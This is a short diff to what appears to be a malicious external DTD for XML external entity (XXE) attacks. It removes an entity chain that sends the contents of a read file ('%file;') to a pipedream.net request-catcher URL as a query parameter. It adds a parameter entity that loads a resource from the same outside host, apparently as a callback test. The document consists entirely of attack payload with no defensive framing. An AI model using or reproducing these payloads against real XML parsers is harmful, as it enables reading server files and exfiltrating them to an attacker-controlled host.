@@ -1,3 +1,1 @@
-<!ENTITY % all “<!ENTITY send SYSTEM ‘https://enhux2ryxst1b.x.pipedream.net/?collect=%file;'>">
-
-%all;
+<!ENTITY % sp SYSTEM "https://enhux2ryxst1b.x.pipedream.net/testLL">
